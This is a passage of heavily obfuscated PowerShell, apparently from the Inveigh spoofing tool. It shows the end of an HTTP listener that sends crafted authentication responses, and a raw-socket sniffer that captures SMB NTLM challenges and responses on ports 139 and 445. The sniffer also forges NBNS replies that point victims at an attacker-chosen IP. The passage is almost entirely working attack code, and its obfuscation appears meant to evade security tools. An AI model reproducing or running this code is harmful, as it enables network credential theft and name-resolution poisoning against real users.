            ${Pa`CKE`T_`h`TTPrESPo`Nse}.("{1}{0}" -f 'dd','A').Invoke(("{3}{2}{0}{1}"-f'se_Serve','r','Respon','HTTP'),[Byte[]](0x53,0x65,0x72,0x76,0x65,0x72,0x3a,0x20,0x4d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x2d,0x48,0x54,0x54,0x50,0x41,0x50,0x49,0x2f,0x32,0x2e,0x30,0x0d,0x0a))
            ${pac`KeT`_HTT`PreSPONsE}.("{0}{1}"-f'A','dd').Invoke(("{5}{4}{0}{1}{3}{2}{6}"-f'ns','e_Time','m','Sta','TPRespo','HT','p'),[Byte[]](0x44,0x61,0x74,0x65,0x3a,0x20) + ${Ht`Tp`_TimeSta`mP} + [Byte[]](0x0d,0x0a))
            ${P`AC`kET`_h`TtPReSPON`se}.("{1}{0}" -f 'd','Ad').Invoke(("{7}{2}{1}{5}{4}{0}{6}{3}" -f'Le','R','P','h','nt','esponse_Conte','ngt','HTT'),${H`Ttp_`He`AdeR_`c`ont`e`NT_LENgTH} + [Byte[]](0x0d,0x0a))

            if(${HtTP`_H`EadE`R_aU`THE`N`TICaTe} -and ${ht`Tp_he`AdE`R_AuTHE`NtI`CaTe_datA})
            {
                ${paCk`eT_HTTp`ResP`OnSE}.("{0}{1}"-f 'Ad','d').Invoke(("{4}{0}{2}{5}{3}{1}"-f'se_A','der','ut','icateHea','HTTPRespon','hent'),${htTp`_He`AdeR_`AUT`hE`NtI`CAte} + ${H`Tt`p_H`E`AdE`R_Aut`HenTIcat`E_`dAtA} + [Byte[]](0x0d,0x0a))
            }

            if(${h`T`T`p_h`eADE`R_cOnTEnt_TY`pE})
            {
                ${PAc`KEt_`hT`TPre`SpoNSE}.("{1}{0}" -f'dd','A').Invoke(("{6}{2}{0}{5}{3}{4}{1}"-f'es','tType','TTPR','onte','n','ponse_C','H'),${httP_h`E`AD`eR_C`oNTEnt_TYPE} + [Byte[]](0x0d,0x0a))
            }

            if(${HtTP_heA`DeR`_`C`AcH`e_`conTrOL})
            {
                ${paCket_`httPrE`s`PonSe}.("{1}{0}"-f'dd','A').Invoke(("{0}{1}{3}{5}{7}{6}{2}{4}"-f 'HT','TPRespo','ro','ns','l','e_Cache','ont','C'),${HttP_HEaD`E`R`_caCHe`_`C`o`NtRol} + [Byte[]](0x0d,0x0a))
            }

            if(${h`T`TP_sENd})
            {
                ${pacKe`T_Ht`TPRe`spoNSe}.("{0}{1}"-f 'A','dd').Invoke(("{2}{0}{1}{3}{4}" -f'TTPR','espo','H','ns','e_Message'),[Byte[]](0x0d,0x0a) + ${hT`TP`_MEs`sage_`Bytes})
                ${ht`T`p_rESpONsE} = &("{6}{7}{2}{0}{5}{4}{3}{1}" -f 'cke','tionary','rom-Pa','ic','dD','tOrdere','Conve','rtF') ${pA`CkEt`_`hTtPrEsponSe}
                ${HTTP_ST`RE`Am}.("{1}{0}" -f 'te','Wri').Invoke(${h`T`T`P_`RespOnSE},0,${h`TTP`_R`EspONSe}."LEN`Gth")
                ${htT`p_`S`TREaM}.("{0}{1}"-f 'F','lush').Invoke()
            }

            &("{1}{0}{2}" -f't-Sle','Star','ep') -m 10
            ${hT`TP_rE`qu`eSt_R`AW_U`Rl_OlD} = ${H`Ttp`_`REqu`est`_r`AW_Url}
            ${Htt`p`_cli`eNT_hA`NDlE_`o`lD} = ${h`TTP_c`LIe`NT}."Cli`Ent"."h`ANDLE"

            if(${HttP_`cLI`ent_`cloSE})
            {
                ${hTTp_R`e`SET_`delaY} = ${Fal`Se}

                if(${pR`Ox`Y`_L`iSTENeR})
                {
                    ${Http_C`li`e`Nt}."CLIE`NT".("{0}{1}" -f'Cl','ose').Invoke()
                }
                else
                {
                    ${ht`TP`_cliE`NT}.("{1}{0}" -f 'se','Clo').Invoke()
                }

            }

        }
        else
        {

            if(${htt`p_d`ATA_`A`VAilAb`le} -or !${H`T`TP_`R`EsET_DeL`AY} -or ${HTTP_rEse`T`_`DE`laY_st`OpWATcH}."eLA`pSeD" -ge ${hTT`p`_Re`sEt`_dEL`AY_`TIMeoUT})
            {
                ${HTTP`_CL`Ie`NT}.("{0}{1}"-f 'Clo','se').Invoke()
                ${HT`TP`_cLieN`T`_cLO`Se} = ${tr`UE}
                ${HtTP_R`Eset`_DE`laY} = ${f`Alse}
            }
            else
            {
                &("{0}{1}{3}{2}"-f'Start','-','ep','Sle') -m 100
            }

        }
    
    }

    ${httP`_cL`I`EnT}.("{1}{0}" -f 'ose','Cl').Invoke()
    &("{2}{1}{0}"-f'p','-slee','start') -s 1
    ${H`TtP_L`IS`TENEr}."SeR`VEr"."bL`oCKinG" = ${FAl`se}
    &("{3}{0}{2}{1}" -f 'art-Sl','p','ee','St') -s 1
    ${Http`_`lIst`ENEr}."sE`RVeR".("{1}{0}"-f 'lose','C').Invoke()
    &("{2}{0}{1}{3}" -f'tart-Sl','ee','S','p') -s 1
    ${HttP_LI`st`ENEr}.("{0}{1}" -f'St','op').Invoke()
}


${SNI`F`FeR_`ScRiPTblo`Ck} = 
{
    param (${ip},${lL`MNr},${Ll`mnR_RespO`N`S`e_mE`sSage},${llMnrt`TL},${mD`Ns},${mdnS_Re`s`Po`Nse_`MeSsAge},${md`NS`TYPes},${mDn`S`TTL},${N`BnS},${nb`Ns`_rEs`POnSe_ME`ssaGe},${NbnSt`Yp`eS},${n`B`NSTTl},${S`mb},${SPo`Ofe`RHoSt`SIGN`ORE},${sPo`ofErHoST`sRe`PLY},${S`po`O`FErIP},${spoof`ER`IpS`I`GNoRe},${s`P`Oo`FE`RIpSrePlY},
            ${SP`Oo`F`ErlEa`RNinG},${SP`OOfERLE`Ar`NIn`GdElAy},${s`pOOFerL`EARN`in`GiNTerVAL})

    ${S`NIfFE`R_rU`NNINg} = ${tR`Ue}
    ${b`YtE_`in} = &("{0}{1}{2}{3}" -f'Ne','w-','Objec','t') ("{1}{2}{0}"-f 'te[]','Syst','em.By') 4	
    ${BYT`E_`oUT} = &("{0}{2}{1}"-f'New-O','ect','bj') ("{3}{1}{2}{0}"-f'Byte[]','ste','m.','Sy') 4	
    ${BY`TE_`dA`Ta} = &("{0}{2}{1}" -f'N','t','ew-Objec') ("{2}{3}{0}{1}"-f 'e','m.Byte[]','S','yst') 4096
    ${bYT`e_In}[0] = 1
    ${bY`T`E_In}[1-3] = 0
    ${ByT`E_O`Ut}[0] = 1
    ${b`Y`TE_out}[1-3] = 0
    ${sn`iFFEr_`SoCket} = &("{3}{1}{2}{0}" -f 't','w-Ob','jec','Ne') ("{1}{2}{3}{4}{0}"-f't','System.Net.','Socke','ts.Soc','ke')(  (&("{0}{1}{2}"-f'gET-','iT','eM')  VArIABlE:oGWf).VaLue::"i`NTERnet`WoRk", $Ibre4n::"r`AW", ( &("{2}{1}{0}"-f'AblE','Ri','Va') s8x6  -vAluEON)::"ip")
    ${SnIFFer_s`O`cK`Et}.("{1}{0}{3}{2}" -f'tSocket','Se','tion','Op').Invoke("IP",("{4}{0}{2}{3}{1}"-f'aderI','d','nclud','e','He'),${t`RuE})
    ${S`NiffER`_`socket}."r`Ece`i`VEBuffers`ize" = 4096

    try
    {
        ${E`Nd_pO`Int} = &("{0}{2}{1}" -f 'Ne','ect','w-Obj') ("{3}{1}{2}{0}{4}" -f 'dpo','ystem.Net.IP','En','S','int')([System.Net.IPAddress]"$IP",0)
    }
    catch
    {
        ${In`Ve`igh}."coNs`OLe_QUE`Ue".("{0}{1}" -f 'A','dd').Invoke(("$(Get-Date -format 's') - Error starting sniffer/spoofer "))
        ${sni`F`FeR_r`U`NNINg} = ${F`Al`se}

        if(${inv`e`IgH}."fI`LE`_outp`Ut")
        {
            ${I`NVEi`Gh}."lO`G`_`File`_QUeUE".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - Error starting sniffer/spoofer "))
        }

        if(${iN`V`eIgh}."L`Og_`ouTpuT")
        {
            ${I`NV`EIgh}."l`Og".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - Error starting sniffer/spoofer "))
        }

    }

    ${Sn`i`Ffer_so`CkET}.("{0}{1}"-f 'Bin','d').Invoke(${enD_`P`oInT})
    ${SNiFfE`R_So`C`keT}."Io`c`ONTROl"(  $AzQ7M::"ReCeI`VE`All",${byTe_`IN},${B`Y`Te_ouT})
    ${LL`mn`R`_`TtL_BYTEs} =  $Cyj6E1::("{1}{0}"-f 'ytes','GetB').Invoke(${Llm`NRt`Tl})
     (&("{1}{0}{2}"-f 'vaRIABL','gET-','e')  ("3"+"Xp")).vALuE::("{0}{1}{2}"-f'Rever','s','e').Invoke(${LL`M`N`R_TTl_byt`Es})
    ${md`NS_T`TL_`BYtes} =   $CyJ6e1::("{0}{1}{2}" -f 'Ge','tB','ytes').Invoke(${mD`NS`TTL})
      (&("{0}{1}" -f 'I','TEM')  ('v'+'ArIaBlE:3'+'x'+'p')  ).vALUE::("{1}{0}"-f'everse','R').Invoke(${mD`N`S_Ttl_B`yTeS})
    ${NB`Ns_`TTL_`BYtEs} =  $cyJ6e1::("{1}{0}" -f 'etBytes','G').Invoke(${N`B`NsTTL})
      (&("{1}{0}{2}"-f'eT','G','-iTem')  vARIABLE:3XP ).VAlUe::("{0}{1}" -f'Re','verse').Invoke(${Nb`NS_Tt`l_B`YTes})
    ${ll`mNR_Learn`INg`_`L`OG} = &("{3}{2}{0}{1}"-f 'Objec','t','-','New') ("{7}{1}{4}{3}{9}{5}{8}{10}{2}{6}{0}"-f'[string]','ti','.','.','ons','er','List','System.Collec','i','Gen','c')
    ${NBns_lEAR`N`I`NG_l`oG} = &("{1}{2}{0}"-f 'Object','Ne','w-') ("{1}{9}{7}{4}{2}{6}{5}{0}{8}{3}"-f'List[str','Syst','ections.Generi','ng]','l','.','c','Col','i','em.')

    if(${s`pOOFErlEA`Rn`ing`DElAy})
    {    
        ${Sp`oOfeR_lea`R`NiNg_De`LaY} = &("{1}{3}{0}{2}"-f'T','New','imeSpan','-') -Minutes ${sP`o`OferLE`A`Rnin`GDEl`Ay}
        ${Sp`OofeR_`Le`Arni`Ng_s`TOPwAtcH} =  $BSD::("{0}{2}{1}" -f 'Start','ew','N').Invoke()
    }

    while(${inV`eI`gH}."Run`NInG" -and ${SNi`F`Fer`_RUN`NiNG})
    {
        ${PAC`K`Et`_Data} = ${S`NiF`F`eR_`sOcKEt}."RE`ceIvE"(${byTE`_D`ATa},0,${By`Te_da`TA}."lE`N`gtH", $r6iy0q::"No`NE")
        ${mEm`ORY`_St`REam} = &("{0}{2}{1}" -f 'New-O','t','bjec') ("{5}{2}{0}{3}{1}{6}{4}" -f 'm.IO.Memory','t','te','S','eam','Sys','r')(${BY`TE`_DaTA},0,${PaCK`E`T_dATa})
        ${BIN`ArY_REad`Er} = &("{2}{0}{1}{3}"-f'e','w','N','-Object') ("{3}{1}{4}{2}{0}"-f'er','stem.I','inaryRead','Sy','O.B')(${mE`M`OrY`_S`TREAM})
        ${VE`RSIo`N_hl} = ${BInAry_`Re`A`deR}.("{0}{1}" -f'R','eadByte').Invoke()
        ${Bi`NarY`_ReaD`ER}.("{1}{2}{0}" -f'te','Read','By').Invoke() > ${nU`ll}
        ${tO`T`A`L_LEn`gTH} = &("{0}{3}{1}{2}"-f 'D','oU','Int16','ataT') ${BINAry_rE`A`deR}.("{0}{1}{2}" -f'Read','By','tes').Invoke(2)
        ${b`iNaRY`_RE`AdER}.("{0}{1}{2}" -f'Re','ad','Bytes').Invoke(5) > ${Nu`Ll}
        ${pROToc`OL_`Num`Ber} = ${BiN`ArY`_rEAd`ER}.("{2}{1}{0}"-f'yte','dB','Rea').Invoke()
        ${BIN`ARy`_r`eaDEr}.("{0}{2}{1}" -f 'R','ytes','eadB').Invoke(2) > ${N`UlL}
        ${soUr`ce_i`P_bytEs} = ${BInaR`Y`_REa`d`er}.("{2}{0}{1}" -f'te','s','ReadBy').Invoke(4)
        ${SO`Ur`Ce_IP} = [System.Net.IPAddress]${SOu`RCE`_i`p_BYtES}
        ${d`E`sTIn`At`ion`_IP_B`yteS} = ${BinA`R`y_`R`EaDeR}.("{2}{1}{0}" -f 's','te','ReadBy').Invoke(4)
        ${Dest`I`NAT`IOn_iP} = [System.Net.IPAddress]${dEsTI`NA`Tion_IP_`BytES}
        ${hEA`D`er_LeNG`Th} = [Int]"0x$(('{0:X}' -f $version_HL)[1])" * 4
        
        switch(${prOTOcOL`_`N`Umb`Er})
        {
            
            6 
            {  
                ${SoU`RCe`_poRt} = &("{0}{2}{1}" -f 'DataToU','16','Int') ${Bi`NArY_`Re`A`DER}.("{0}{1}{2}" -f 'R','eadB','ytes').Invoke(2)
                ${destinaTIo`N`_`pORt} = &("{0}{2}{3}{1}" -f'Dat','6','aToU','Int1') ${bi`N`ArY`_Re`ADER}.("{0}{1}" -f 'Read','Bytes').Invoke(2)
                ${BiNArY_R`EA`DER}.("{0}{1}{2}"-f'ReadB','yt','es').Invoke(8) > ${N`UlL}
                ${Tcp_he`ADEr_l`E`NgTH} = [Int]"0x$(('{0:X}' -f $binary_reader.ReadByte())[0])" * 4
                ${bIN`A`RY_`R`eaDER}.("{2}{1}{0}" -f 'dBytes','a','Re').Invoke(7) > ${N`UlL}
                ${P`AYL`oaD_ByT`es} = ${b`i`NARY_Rea`DeR}.("{0}{2}{1}"-f 'ReadByt','s','e').Invoke(${TotAL_l`Eng`TH} - (${hE`AdE`R_`LEn`gth} + ${TC`P_H`eADe`R_LE`NgTh}))

                switch (${D`E`stInAtiOn_p`ORt})
                {

                    139 
                    {
                        if(${S`mB} -eq 'Y')
                        {

                            if(${NTlm`_`ChAlLeNGE} -and ${C`lie`Nt_IP} -eq ${SOUR`C`e`_ip} -and ${cLIe`NT_`PorT} -eq ${sOu`RCe`_po`RT})
                            {
                                &("{1}{4}{2}{3}{0}" -f'e','SMBN','s','pons','TLMRe') ${pAYl`oad`_`BY`TeS}
                            }

                            ${CLi`e`NT_IP} = ""
                            ${cl`I`eNt_P`ORt} = ""
                            ${Ntl`m`_C`HAlLeNGe} = ""
                        
                        }
                    }

                    445
                    {
                     
                        if(${S`Mb} -eq 'Y')
                        {

                            if(${nTLM`_`cHAL`Lenge} -and ${cLi`ENt`_Ip} -eq ${sOUR`Ce_`ip} -and ${cl`iEn`T_port} -eq ${sOUR`c`e_pOrt})
                            {
                                &("{0}{3}{1}{2}" -f 'SM','on','se','BNTLMResp') ${Pa`ylOAd_BY`TES}
                            }

                            ${clie`Nt_`IP} = ""
                            ${C`LIeNt`_PoRT} = ""
                            ${nTLm_C`haLl`ENge} = ""

                        }
                    
                    }

                }

                
                switch (${sOuRC`e`_pO`RT})
                {

                    139 
                    {

                        if(${S`mb} -eq 'Y')
                        {   
                            ${cliEN`T_`ip} = ${DE`S`TInaTiO`N_ip} 
                            ${CLieN`T`_pO`RT} = ${De`st`inA`TioN_Po`Rt}
                            ${Ntlm_c`Ha`l`lENge} = &("{2}{1}{3}{0}" -f 'enge','NTL','SMB','MChall') ${payLo`A`d_Byt`es}
                        }
                    
                    }

                    445 
                    {

                        if(${s`mb} -eq 'Y')
                        {   
                            ${cl`Ie`Nt_iP} = ${DesTI`NAT`ion`_IP} 
                            ${c`l`IENT_PoRt} = ${d`esTIna`Tion_`poRt}
                            ${n`Tl`M_`cHalLEnGE} = &("{3}{0}{4}{2}{1}" -f 'MB','ge','Challen','S','NTLM') ${pa`Y`LoaD_`BYtES}
                        }
                    
                    }
                
                }

            }
                
            17 
            {  
                ${s`oUrCe_Po`RT} = ${B`i`NARy`_RE`AdeR}.("{2}{0}{1}" -f'Byt','es','Read').Invoke(2)
                ${e`NDp`oIn`T_SOUrCe_p`OrT} = &("{0}{2}{1}" -f 'D','taToUInt16','a') (${sourc`E_`P`ORT})
                ${de`ST`in`A`TI`On_PORT} = &("{3}{2}{0}{1}"-f 'o','UInt16','taT','Da') ${BiN`A`RY_rEAD`eR}.("{1}{2}{0}" -f'dBytes','Re','a').Invoke(2)
                ${U`dP`_leng`Th} = ${b`inARY_`RE`A`dER}.("{0}{1}{2}" -f 'Rea','dBy','tes').Invoke(2)
                ${u`D`P_LeNgtH`_uINT}  = &("{1}{3}{0}{2}" -f 't','Dat','16','aToUIn') (${UdP`_leNg`TH})
                ${b`iNa`Ry`_reADeR}.("{3}{1}{2}{0}" -f 'ytes','d','B','Rea').Invoke(2) > ${N`Ull}
                ${pAyLOAd_`B`y`TES} = ${b`inAry`_`Re`ADeR}.("{2}{1}{0}" -f'ytes','eadB','R').Invoke((${udP_`L`eNg`TH_UiNT} - 2) * 4)

                
                switch(${desti`NAT`IO`N_POrT})
                {

                    137 
                    {
                     
                        if(( (&('lS') ("vaRIA"+"B"+"LE:cy"+"J6"+"e1")).VALUE::"t`Os`TRinG"(${PAYl`OAD_`By`TEs}[4..7]) -eq ("{1}{2}{0}" -f'00-00','0','0-01-') -or   $CYJ6e1::"to`stR`INg"(${payl`oa`D_bYt`eS}[4..7]) -eq ("{1}{0}{2}{3}"-f'00-','00-','0','0-01')) -and  $cYj6E1::"tOsTR`i`NG"(${PA`YloaD`_`BYTES}[10..11]) -ne ("{1}{0}"-f'01','00-'))
                        {
                            ${udP`_L`ENG`TH}[0] += 12
                        
                            ${NbNS_RE`s`POn`S`E`_DaTa} = ${pAYLOaD_`BY`T`es}[13..${p`AyLOAd_b`Y`Tes}."le`NGTH"] +
                                                    ${nbN`s_ttl`_`Byt`Es} +
                                                    0x00,0x06,0x00,0x00 +
                                                    ([System.Net.IPAddress][String]([System.Net.IPAddress]${SP`O`Of`Erip})).("{3}{1}{0}{2}{4}"-f'ress','tAdd','Byte','Ge','s').Invoke()
                
                            ${N`BnS_reS`poNSE_Pa`CKET} = 0x00,0x89 +
                                                    ${s`o`URce_p`ort}[1,0] +
                                                    ${ud`P_lEn`GTh}[1,0] +
                                                    0x00,0x00 +
                                                    ${pAyloA`d_`B`Y`TEs}[0,1] +
                                                    0x85,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x20 +
                                                    ${nb`Ns_Re`Spons`e`_D`Ata}
                
                            ${n`B`NS_QuER`y_TY`pE} =   (&("{0}{1}{2}" -f'chIldi','TE','M')  VariaBLe:cyJ6E1).vaLuE::"tOSTr`i`Ng"(${pAyLOad_b`Yt`eS}[43..44])
                    
                            switch (${nBNS_`QU`Ery_`Ty`pE})
                            {

                                ("{0}{1}"-f'41-4','1')
                                {
                                    ${NbnS_q`Ue`R`Y`_TYPE} = '00'
                                }

                                ("{0}{1}" -f '41-4','4')
                                {
                                    ${n`BNS`_q`UER`y`_type} = '03'
                                }

                                ("{0}{1}" -f '43','-41')
                                {
                                    ${N`BnS_Que`Ry_`Ty`pe} = '20'
                                }

                                ("{1}{0}"-f '2-4C','4')
                                {
                                    ${nbNS_`Q`UE`Ry_`TYpe} = '1B'
                                }

                                ("{1}{0}"-f'D','42-4')
                                {
                                    ${N`BNS_Qu`ery_t`YPE} = '1C'
                                }

                                ("{0}{1}"-f '42','-4E')
                                {
                                    ${NbN`s_Qu`e`R`y_tyPE} = '1D'
                                }

                                ("{1}{0}"-f '-4F','42')
                                {
                                    ${n`BNS_QuER`y_`T`yPE} = '1E'
                                }

                            }

                            ${Nb`NS_q`U`ERY} =   (  &("{1}{0}" -f'i','gC')  ('var'+'iab'+'lE'+':CYj6'+'E1')).vaLuE::"TOS`Tr`iNg"(${P`AYload_b`YT`Es}[13..(${P`Ay`L`oAd_BY`TeS}."LENg`Th" - 4)])
                            ${NB`NS_q`UE`Ry} = ${NB`N`S_QuerY} -replace "-00",""
                            ${nB`Ns_Que`RY} = ${n`BNs`_querY}.("{1}{0}" -f'lit','Sp').Invoke("-") | &("{0}{1}{2}" -f 'ForEach-O','bjec','t'){[Char]  $IgU7qm::("{0}{1}" -f'ToInt1','6').Invoke(${_},16)}
                            ${NBn`S_q`U`ERY_s`TR`INg`_en`c`oDeD} = &("{2}{0}{1}" -f'-Objec','t','New') ("{0}{1}{2}" -f'Sy','stem.Stri','ng') (${NB`NS_qu`ErY},0,${N`Bn`S_`QueRY}."leng`Th")
                            ${NbnS_Quer`Y_`STRiNg_e`N`COdED} = ${NbnS_Q`Ue`RY_S`TRInG`_`EncOD`ed}.("{0}{2}{1}"-f 'Su','ing','bstr').Invoke(0,${N`BNs_QUERy_`sT`RING`_e`NcOd`Ed}.("{2}{1}{0}" -f 'Of','x','Inde').Invoke("CA"))
                            ${NbN`s`_`QUerY_strING_s`UBtRACt`ED} = ""
                            ${nbNS_`QuER`Y_`STR`inG} = ""
                            ${N} = 0
                            
                            do
                            {
                                ${n`BNS`_`QUE`Ry`_St`RiNG_Sub} = (([Byte][Char](${N`BnS_qUE`RY_`S`TrI`NG_EnCo`DeD}.("{1}{0}"-f 'ng','Substri').Invoke(${N},1))) - 65)
                                ${NBNs_`que`R`y_sTRi`Ng_`sUbTr`AC`TEd} += ( $iGU7qm::("{0}{1}" -f'ToSt','ring').Invoke(${NBnS_qu`eR`Y_`St`RiN`G`_SUB},16))
                                ${n} += 1
                            }
                            until(${n} -gt (${N`B`N`S`_querY`_`STRInG`_eNCOded}."leN`GtH" - 1))
                    
                            ${N} = 0
                    
                            do
                            {
                                ${nbn`s_qu`eR`Y_s`Tr`ING} += ([Char](  (&("{3}{1}{2}{0}"-f 'e','et-varIA','BL','G')  IgU7Qm).VAlUe::("{1}{0}{2}" -f'nt1','ToI','6').Invoke(${nB`NS_QU`ERy`_strI`N`g_`subtracteD}.("{0}{2}{1}"-f 'Subs','g','trin').Invoke(${N},2),16)))
                                ${N} += 2
                            }
                            until(${N} -gt (${nbns`_QUEry_STrI`NG_`s`UBTr`AcTED}."Len`gtH" - 1) -or ${N`BNS_query_`s`Tri`NG}."LeNg`Th" -eq 15)

                            ${NBn`s_rEQUESt_`I`gnoRe} = ${Fa`Lse}

                            if(${n`Bns} -eq 'Y')
                            {

                                if(${s`PO`O`F`ErlEARNiNG} -eq 'Y' -and ${i`NV`EIGh}."VaLiD`_`HosT_lI`ST" -notcontains ${N`BN`s_QU`eRy_STRing} -and   (  &("{1}{0}"-f'R','DI') ("v"+"AR"+"IABLe:cY"+"J6e1") ).valUe::"t`OST`RInG"(${p`AyLO`Ad_`By`TEs}[4..7]) -eq ("{2}{1}{3}{0}"-f'0','-0','00-01','0-0') -and ${soU`R`cE_IP} -ne ${i`P})
                                {
                                
                                    if((${nBNs_lEAr`N`I`Ng_`l`og}.("{0}{1}" -f 'E','xists').Invoke({param(${S}) ${S} -like ('20*'+' '+"$NBNS_query_string")})))
                                    {
                                        ${nB`NS`_L`eA`RNI`Ng_qUEue`_t`ImE} = [DateTime]${n`B`N`S_LE`Arning_lOg}.("{1}{0}"-f'd','Fin').Invoke({param(${S}) ${S} -like ('20'+'* '+"$NBNS_query_string")}).("{1}{2}{0}" -f 'ing','Sub','Str').Invoke(0,19)

                                        if((&("{1}{2}{0}" -f 'te','Ge','t-Da')) -ge ${nb`Ns`_Le`A`RNi`Ng_QuEUe_t`i`me}.("{0}{1}{2}"-f 'AddM','in','utes').Invoke(${sPOo`FerLEARNi`NgI`NtE`R`VAl}))
                                        {
                                            ${nbN`s`_l`EARninG`_Log}.("{0}{2}{1}"-f 'Rem','veAt','o').Invoke(${NBN`S_lea`R`N`INg_l`oG}.("{1}{2}{0}" -f'ex','F','indInd').Invoke({param(${S}) ${S} -like ('2'+'0* '+"$NBNS_query_string")}))
                                            ${nBnS_l`E`A`Rn`iNg`_sE`Nd} = ${t`RuE}
                                        }
                                        else
                                        {
                                            ${NbNs_L`EA`RN`Ing_sEND} = ${F`A`lse}
                                        }

                                    }
                                    else
                                    {           
                                        ${Nbn`S_LEar`Ni`N`g_s`eNd} = ${tR`UE}
                                    }

                                    if(${n`Bn`s_LeARniNG_`sE`Nd})
                                    {
                                        ${n`B`NS_T`Ransa`cTi`On_`iD} = [String](1..2 | &("{0}{1}{2}{4}{3}" -f'ForEa','ch','-O','ject','b') {"{0:X2}" -f (&("{0}{3}{2}{1}" -f'G','ndom','Ra','et-') -Minimum 1 -Maximum 255)})
                                        ${N`BNS`_`Tra`N`sACT`Io`N`_Id_bYtES} = ${nbNS_tRaNS`AC`TIo`N_iD}.("{1}{0}" -f 'plit','S').Invoke(" ") | &("{0}{3}{2}{1}" -f'ForEach','t','Objec','-'){[Char]  (&("{3}{2}{0}{1}"-f 'iA','BLE','-VAR','geT') igU7qM ).VAlUe::("{1}{0}"-f '16','ToInt').Invoke(${_},16)}
                                        ${NbNS`_`TRAnsAcTiO`N_`Id} = ${NBnS_`TRAN`s`AcTI`ON_`iD} -replace " ","-"
                                        ${N`BNs_udP_`C`lieNt} = &("{0}{1}{2}" -f'new-Ob','j','ect') ("{2}{4}{6}{5}{0}{1}{3}"-f 'dpCli','e','S','nt','ystem.Net','Sockets.U','.') 137
                                        ${Nb`N`S`_HoS`TnaME_`BytES} = ${PA`yl`oAD_byTES}[13..(${pa`YLO`Ad_bY`T`es}."LeNG`Th" - 5)]

                                        ${NB`NS_rE`Q`UeST_pa`c`k`Et} = ${nbNs_TrAn`s`ActIo`N_id`_b`Yt`es} +
                                                                0x01,0x10,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x20 +
                                                                ${Nb`N`s_`hoSTnaME_b`Y`Tes} +
                                                                0x00,0x20,0x00,0x01

                                        ${NB`NS_Le`AR`NING_`DeSTiNaTI`oN_enDP`OInt} = &("{1}{2}{0}"-f 'w-Object','N','e') ("{2}{0}{3}{4}{1}" -f 'm.N','nt','Syste','e','t.IPEndpoi')( ( &("{0}{2}{1}{3}" -f 'C','It','HILd','Em') VariaBle:j91GQK ).vaLUe::"bROAd`CaST",137)
                                        ${nbnS_Ud`p`_c`lI`ent}.("{1}{0}{2}"-f 'nn','Co','ect').Invoke(${N`Bns_L`eaR`Ni`Ng_dE`sT`InAt`I`On_eNdp`oi`NT})
                                        ${nB`N`S_UDp_`Clie`NT}.("{0}{1}"-f'Sen','d').Invoke(${NB`N`S_rEqUe`ST_`Pack`ET},${nBNs`_reQues`T`_p`AcK`et}."lE`NGth")
                                        ${Nb`NS_u`Dp`_cLienT}.("{0}{1}"-f'Clos','e').Invoke()
                                        ${n`B`Ns_Le`AR`Nin`G_LOg}.("{1}{0}"-f 'dd','A').Invoke(("$(Get-Date -format 's') $NBNS_transaction_ID $NBNS_query_string "))
                                        ${InV`E`igh}."Con`S`OLE_q`U`euE".("{0}{1}" -f'Ad','d').Invoke(("$(Get-Date -format 's') - NBNS request for $NBNS_query_string sent to  ") + ${NBns`_`leArNInG`_desTIN`Ation_`En`dp`OINT}."adDr`e`Ss"."iPaDdR`esST`oST`RiNG")

                                        if(${IN`VeIgh}."fiL`E_Ou`TPUT")
                                        {
                                            ${i`NvEi`gh}."l`o`g_`FILE`_QueUE".("{1}{0}"-f'd','Ad').Invoke(("$(Get-Date -format 's') - LLMNR request for $NBNS_query_string sent to  ") + ${nbnS_`lEAr`NiNg_DeSTI`N`AtIOn_e`NDP`oINT}."aDd`Ress"."I`PaDdre`sS`TOstRiNG")
                                        }

                                        if(${INVe`i`Gh}."l`OG_out`P`UT")
                                        {
                                            ${inVe`IgH}."L`OG".("{0}{1}"-f 'Ad','d').Invoke(("$(Get-Date -format 's') - LLMNR request for $NBNS_query_string sent to  ") + ${NBns_l`e`Arn`iNG_De`ST`INaT`iO`N`_EnDp`OInt}."ADd`REss"."IPAdD`Re`SSToStRi`NG")
                                        }

                                    }

                                }
                                 
                                if((${IN`VE`iGH}."v`A`LID_H`oSt_l`Ist" -notcontains ${nBN`S`_QUERy_stri`Ng} -or ${SpoOf`e`R`H`oSTsRE`Ply} -contains ${nBN`S_`q`U`ery_sTrI`NG}) -and (!${SpoOFErHOs`T`sr`eplY} -or ${SPoOFer`Host`s`Rep`LY} -contains ${n`BnS_quE`R`Y`_STR`iNg}) -and (
                                !${spoO`FErhO`sT`sI`gnO`Re} -or ${SpOOfERhO`S`TsIGN`oRe} -notcontains ${nBnS`_qU`ERY`_`StriNG}) -and (!${S`poOFEri`pSRE`PLY} -or ${Spo`oFeRi`PsR`e`ply} -contains ${so`URcE`_`IP}) -and (
                                !${S`pOOfERI`P`sig`NorE} -or ${sPo`Of`eRi`PSignOre} -notcontains ${sO`URCE_`Ip}) -and (${InV`e`IGh}."Sp`OO`FEr_Re`PE`At" -or ${I`N`VEiGh}."Ip`_CAptuRe`_L`I`sT" -notcontains ${SO`U`RCE_ip}."ipAd`drESstosT`R`ing") -and (${NbNs_Que`R`Y_`sTRI`NG}.("{1}{0}" -f'm','Tri').Invoke() -ne '*') -and (
                                ${spOoferL`E`A`R`NINg} -eq 'N' -or (${sp`ooFErLeA`R`NInG} -eq 'Y' -and !${SP`oOf`E`RlEarNinGDELay}) -or (${sPOoFE`RleaRNI`NgDE`l`AY} -and ${SPOof`eR_`LeARNi`Ng_S`ToPw`AtcH}."el`A`pSeD" -ge ${s`POO`F`e`R_lEarNinG_de`laY})) -and (${S`oU`RCE_IP} -ne ${i`P}) -and (
                                ${N`BNst`Yp`ES} -contains ${nBn`s`_QUEr`Y_T`yPE}))
                                {

                                    if(${sPOO`Fer`L`Ear`NINg} -eq 'N' -or !${N`BNs_`L`EARnING`_`LoG}.("{0}{1}"-f'Exist','s').Invoke({param(${S}) ${S} -like "* " +  $cYJ6E1::"t`osTrINg"(${P`AylOAD`_ByTES}[0..1]) + " *"}))
                                    {
